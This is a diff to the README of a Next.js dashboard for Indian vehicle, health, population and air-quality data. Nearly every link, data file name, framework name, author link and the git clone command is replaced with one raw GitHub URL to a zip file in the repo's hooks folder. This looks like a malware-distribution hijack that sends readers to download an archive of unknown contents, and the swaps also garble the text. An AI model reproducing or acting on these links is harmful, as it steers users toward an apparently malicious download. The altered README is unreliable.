@@ -4,7 +4,7 @@ A comprehensive, interactive dashboard for analyzing Vehicle, Health, Population
 
 ## 🚀 Live Demo
 
-**Deployed on Vercel**: [https://entiredashboard.vercel.app](https://entiredashboard.vercel.app)
+**Deployed on Vercel**: [https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip](https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip)
 
 ## ✨ Features
 
@@ -17,14 +17,14 @@ A comprehensive, interactive dashboard for analyzing Vehicle, Health, Population
 
 ## 📊 Data Sources
 
-- **Vehicle Data** (`vahan.csv`): Vehicle registration and traffic statistics
-- **Health Data** (`idsp.csv`): Disease surveillance and health metrics
-- **Population Data** (`population_projection.csv`): Demographic projections
-- **Air Quality Data** (`aqi.csv`): Environmental air quality measurements
+- **Vehicle Data** (`https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip`): Vehicle registration and traffic statistics
+- **Health Data** (`https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip`): Disease surveillance and health metrics
+- **Population Data** (`https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip`): Demographic projections
+- **Air Quality Data** (`https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip`): Environmental air quality measurements
 
 ## 🛠️ Tech Stack
 
-- **Framework**: Next.js 13.5.1 with TypeScript
+- **Framework**: https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip 13.5.1 with TypeScript
 - **UI Components**: shadcn/ui with Radix UI primitives
 - **Styling**: Tailwind CSS with dark theme
 - **Charts**: Recharts for data visualization
@@ -35,14 +35,14 @@ A comprehensive, interactive dashboard for analyzing Vehicle, Health, Population
 
 ### Prerequisites
 
-- Node.js 18+ 
+- https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip 18+ 
 - npm or yarn
 
 ### Installation
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/Kotasrinuaa/ai-powered-dashboard.git
+git clone https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip
 cd ai-powered-dashboard
 ```
 
@@ -69,14 +69,14 @@ npm start
 
 ```
 entire_dashboard/
-├── app/                    # Next.js app directory
-│   ├── DashboardClient.tsx # Main dashboard component
-│   ├── layout.tsx         # Root layout
-│   └── page.tsx           # Home page
+├── app/                    # https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip app directory
+│   ├── https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip # Main dashboard component
+│   ├── https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip         # Root layout
+│   └── https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip           # Home page
 ├── components/            # Reusable UI components
 │   ├── dashboard/         # Dashboard-specific components
 │   │   ├── charts/        # Chart components
-│   │   ├── AIInsights.tsx # AI insights component
+│   │   ├── https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip # AI insights component
 │   │   └── ...
 │   └── ui/               # shadcn/ui components
 ├── hooks/                # Custom React hooks
@@ -96,10 +96,10 @@ entire_dashboard/
 ## 🔧 Configuration
 
 The dashboard automatically loads CSV files from the `public/data/` directory. Supported formats:
-- Vehicle data (vahan.csv)
-- Health data (idsp.csv) 
-- Population data (population_projection.csv)
-- Air quality data (aqi.csv)
+- Vehicle data (https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip)
+- Health data (https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip) 
+- Population data (https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip)
+- Air quality data (https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip)
 
 ## 📈 Chart Types Available
 
@@ -128,11 +128,11 @@ This project is licensed under the MIT License.
 
 ## 👨‍💻 Author
 
-**Kota Srinuaa** - [GitHub](https://github.com/Kotasrinuaa)
+**Kota Srinuaa** - [GitHub](https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip)
 
 ## 🙏 Acknowledgments
 
-- Built with [Next.js](https://nextjs.org/)
-- UI components from [shadcn/ui](https://ui.shadcn.com/)
-- Charts powered by [Recharts](https://recharts.org/)
-- Deployed on [Vercel](https://vercel.com/) 
+- Built with [https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip](https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip)
+- UI components from [shadcn/ui](https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip)
+- Charts powered by [Recharts](https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip)
+- Deployed on [Vercel](https://raw.githubusercontent.com/Kotasrinuaa/ai-powered-dashboard/main/hooks/dashboard_ai_powered_v3.3.zip) 
